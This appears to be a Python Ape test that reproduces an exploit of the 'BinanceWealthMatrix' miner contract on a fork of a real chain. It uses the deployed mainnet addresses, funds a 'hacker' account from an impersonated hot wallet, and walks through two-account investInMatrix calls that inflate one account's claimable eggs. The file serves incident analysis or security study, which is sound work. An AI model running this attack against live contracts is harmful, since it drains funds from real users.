from ape import project, reverts


def test_exploit(accounts, networks):
    miner = project.BinanceWealthMatrix.at("0x78ac2966d74452e408a2e0e0e41810c8155dcc50")
    token = project.ClimbToken.at("0x3260Ebd17d9038d2C2a3b24FFe5c8f1eA10603df")
    # This is simply to use USDT
    usdt = project.TestToken.at("0x55d398326f99059fF775485246999027B3197955")
    # Check the current balance of the miner
    init_miner_balance = token.balanceOf(miner.address)

    hacker1 = accounts[0]
    hacker2 = accounts[1]

    # Send hacker1 100 usdt
    hot_wallet = accounts["0xf977814e90da44bfa03b6295a0616a897441acec"]
    usdt.transfer(hacker1.address, 100 * int(1e18), {"from": hot_wallet})

    # How the exploit worked out is that hacker1 would invest 100 usdt using investInMatrix then hacker2 would invest 0.05 eth using investInMatrix payable version
    # After each reinvestment by hacker2, hacker1 would be able to call matrixRedeem and get more funds back.

    # The first step is to invest 100 usdt using investInMatrix
    deposit_amount = 100 * int(1e18)
    usdt.approve(miner.address, deposit_amount, {"from": hacker1})
    miner.investInMatrix(hacker1.address, deposit_amount, {"from": hacker1})

    hacker1_eggs = miner.claimedEggs(hacker1.address)
    assert hacker1_eggs == 0
    assert miner.getMyEggs({"from": hacker1}) == 0

    # Hacker 2 invests 0.05 eth using investInMatrix payable version
    miner.investInMatrix(hacker2.address, {"from": hacker2, "value": 0.05 * int(1e18)})
    hacker2_eggs = miner.claimedEggs(hacker2.address)
    assert hacker2_eggs == 0
    assert miner.claimedEggs(hacker1.address) > 0
